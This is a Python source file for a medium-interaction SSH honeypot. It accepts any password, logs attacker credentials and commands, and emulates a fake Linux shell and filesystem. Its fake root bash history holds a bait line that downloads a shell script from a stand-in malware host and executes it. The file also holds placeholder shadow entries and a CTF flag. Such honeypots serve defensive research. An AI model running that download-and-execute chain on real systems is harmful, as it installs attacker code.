"""
Medium-interaction SSH honeypot.
Accepts authentication and provides a fake shell environment.
Supports basic Linux commands: ls, cat, pwd, whoami, id, uname, cd, echo, help, exit.
Logs every command entered.
"""

import socket
import threading
import os
import paramiko

from honeypots.base import BaseHoneypot
import config


# ── Fake filesystem ───────────────────────────────────────────────────
_FAKE_FS = {
    "/": ["bin", "etc", "home", "var", "tmp", "usr", "root"],
    "/home": ["admin"],
    "/home/admin": [".bashrc", ".ssh", "notes.txt"],
    "/etc": ["passwd", "shadow", "hosts", "hostname", "ssh"],
    "/etc/ssh": ["sshd_config"],
    "/var": ["log", "www"],
    "/var/log": ["auth.log", "syslog", "kern.log"],
    "/tmp": [],
    "/root": [".bashrc", ".bash_history", "flag.txt"],
    "/usr": ["bin", "lib", "share"],
}

_FAKE_FILES = {
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nadmin:x:1000:1000:admin:/home/admin:/bin/bash\n",
    "/etc/shadow": "root:$6$rounds=656000$FAKE_SALT$FAKE_HASH:19500:0:99999:7:::\nadmin:$6$rounds=656000$FAKE$HASH:19500:0:99999:7:::\n",
    "/etc/hosts": "127.0.0.1\tlocalhost\n192.168.1.100\tfileserver01\n",
    "/etc/hostname": "ubuntu-server-01\n",
    "/home/admin/notes.txt": "TODO:\n- Change default passwords\n- Update firewall rules\n- Check backup schedule\n",
    "/home/admin/.bashrc": "# ~/.bashrc\nexport PS1='\\u@\\h:\\w\\$ '\nalias ll='ls -la'\n",
    "/root/flag.txt": "CTF{y0u_f0und_th3_h0n3yp0t}\n",
    "/root/.bash_history": "ls -la\ncat /etc/passwd\nwget http://malware.example.com/shell.sh\nchmod +x shell.sh\n./shell.sh\n",
    "/var/log/auth.log": "Mar 10 08:12:01 ubuntu sshd[1234]: Accepted password for admin from 10.0.0.5 port 54321 ssh2\n",
}


class _MedSSHServer(paramiko.ServerInterface):
    """Paramiko server interface that accepts specific credentials."""

    def __init__(self, client_ip: str, hp_logger):
        super().__init__()
        self.client_ip = client_ip
        self.hp_logger = hp_logger
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if self.hp_logger:
            self.hp_logger.log_credential(
                honeypot_name="med_ssh",
                src_ip=self.client_ip,
                username=username,
                password=password,
            )
        # Accept all credentials to lure attacker into the shell
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height,
                                  pixelwidth, pixelheight, modes):
        return True


class MedSSHHoneypot(BaseHoneypot):
    """Medium-interaction SSH honeypot with a fake interactive shell."""

    def __init__(self, host: str = None, port: int = None, logger=None):
        super().__init__(
            name="med_ssh",
            host=host or config.BIND_HOST,
            port=port or config.MED_SSH_PORT,
            logger=logger,
        )
        self._host_key = self._get_or_create_host_key()

    def _get_or_create_host_key(self) -> paramiko.RSAKey:
        key_path = config.SSH_HOST_KEY_FILE
        os.makedirs(os.path.dirname(key_path), exist_ok=True)
        if os.path.exists(key_path):
            return paramiko.RSAKey.from_private_key_file(key_path)
        key = paramiko.RSAKey.generate(2048)
        key.write_private_key_file(key_path)
        return key

    def handle_connection(self, client_socket: socket.socket, client_address: tuple):
        transport = None
        try:
            transport = paramiko.Transport(client_socket)
            transport.local_version = config.SSH_BANNER
            transport.add_server_key(self._host_key)

            server = _MedSSHServer(client_address[0], self.hp_logger)
            transport.start_server(server=server)

            channel = transport.accept(60)
            if channel is None:
                return

            # Wait for shell request
            server.event.wait(10)

            # Start the session
            if self.hp_logger:
                sid = self.hp_logger.start_session("med_ssh", client_address[0])
            else:
                sid = None

            self._run_shell(channel, client_address[0], sid)

        except Exception as e:
            self._log.debug(f"Med SSH error: {e}")
        finally:
            if transport:
                try:
                    transport.close()
                except Exception:
                    pass

    def _run_shell(self, channel, client_ip: str, session_id: str):
        """Run a fake bash-like shell over the paramiko channel."""
        cwd = "/home/admin"
        username = "admin"
        hostname = "ubuntu-server-01"
        cmd_count = 0

        try:
            channel.sendall(f"Welcome to Ubuntu 20.04.6 LTS\r\n\r\n".encode())
            prompt = f"{username}@{hostname}:{cwd}$ "
            channel.sendall(prompt.encode())

            buf = ""
            while True:
                data = channel.recv(1024)
                if not data:
                    break

                for ch in data.decode("utf-8", errors="replace"):
                    if ch in ("\r", "\n"):
                        cmd = buf.strip()
                        buf = ""
                        channel.sendall(b"\r\n")

                        if not cmd:
                            channel.sendall(prompt.encode())
                            continue

                        cmd_count += 1
                        response = self._process_command(cmd, cwd, username)

                        # Log the command
                        if self.hp_logger:
                            self.hp_logger.log_command(
                                honeypot_name="med_ssh",
                                src_ip=client_ip,
                                command=cmd,
                                response=response,
                            )

                        if cmd.strip() == "exit":
                            channel.sendall(b"logout\r\n")
                            if self.hp_logger and session_id:
                                self.hp_logger.end_session(session_id, cmd_count)
                            return

                        # Handle cd for prompt update
                        if cmd.startswith("cd "):
                            target = cmd[3:].strip()
                            new_cwd = self._resolve_path(cwd, target)
                            if new_cwd in _FAKE_FS:
                                cwd = new_cwd
                            prompt = f"{username}@{hostname}:{cwd}$ "

                        if response:
                            channel.sendall(response.encode() + b"\r\n")
                        channel.sendall(prompt.encode())

                    elif ch == "\x7f" or ch == "\x08":  # backspace
                        if buf:
                            buf = buf[:-1]
                            channel.sendall(b"\x08 \x08")
                    elif ch == "\x03":  # Ctrl+C
                        buf = ""
                        channel.sendall(b"^C\r\n")
                        channel.sendall(prompt.encode())
                    else:
                        buf += ch
                        channel.sendall(ch.encode())

        except (EOFError, OSError):
            pass
        finally:
            if self.hp_logger and session_id:
                self.hp_logger.end_session(session_id, cmd_count)

    def _resolve_path(self, cwd: str, target: str) -> str:
        """Resolve a relative or absolute path."""
        if target.startswith("/"):
            return target.rstrip("/") or "/"
        parts = cwd.split("/")
        for p in target.split("/"):
            if p == "..":
                if len(parts) > 1:
                    parts.pop()
            elif p and p != ".":
                parts.append(p)
        return "/".join(parts) or "/"

    def _process_command(self, cmd: str, cwd: str, username: str) -> str:
        """Process a command and return a fake response."""
        parts = cmd.split()
        base_cmd = parts[0] if parts else ""

        if base_cmd == "ls":
            target = cwd
            if len(parts) > 1 and not parts[-1].startswith("-"):
                target = self._resolve_path(cwd, parts[-1])
            entries = _FAKE_FS.get(target, None)
            if entries is None:
                return f"ls: cannot access '{target}': No such file or directory"
            return "  ".join(entries)

        elif base_cmd == "cat":
            if len(parts) < 2:
                return ""
            filepath = self._resolve_path(cwd, parts[1])
            content = _FAKE_FILES.get(filepath)
            if content:
                return content.rstrip("\n")
            return f"cat: {parts[1]}: No such file or directory"

        elif base_cmd == "pwd":
            return cwd

        elif base_cmd == "whoami":
            return username

        elif base_cmd == "id":
            return f"uid=1000({username}) gid=1000({username}) groups=1000({username}),27(sudo)"

        elif base_cmd == "uname":
            if "-a" in parts:
                return "Linux ubuntu-server-01 5.4.0-196-generic #216-Ubuntu SMP x86_64 GNU/Linux"
            return "Linux"

        elif base_cmd == "hostname":
            return "ubuntu-server-01"

        elif base_cmd == "cd":
            target = parts[1] if len(parts) > 1 else "/home/admin"
            new_cwd = self._resolve_path(cwd, target)
            if new_cwd not in _FAKE_FS:
                return f"bash: cd: {target}: No such file or directory"
            return ""

        elif base_cmd == "echo":
            return " ".join(parts[1:])

        elif base_cmd == "wget" or base_cmd == "curl":
            return f"bash: {base_cmd}: command not found"

        elif base_cmd == "help":
            return "GNU bash, version 5.0.17(1)-release\nType 'help' for more info."

        elif base_cmd == "exit":
            return ""

        elif base_cmd == "history":
            return "    1  ls -la\n    2  cat /etc/passwd\n    3  pwd\n    4  whoami"

        elif base_cmd == "ifconfig" or base_cmd == "ip":
            return (
                "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
                "        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255\n"
                "        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)"
            )

        elif base_cmd == "ps":
            return (
                "  PID TTY          TIME CMD\n"
                " 1234 pts/0    00:00:00 bash\n"
                " 5678 pts/0    00:00:00 ps"
            )

        elif base_cmd == "w" or base_cmd == "who":
            return f"{username}  pts/0  :0  Mar 10 08:00"

        else:
            return f"bash: {base_cmd}: command not found"
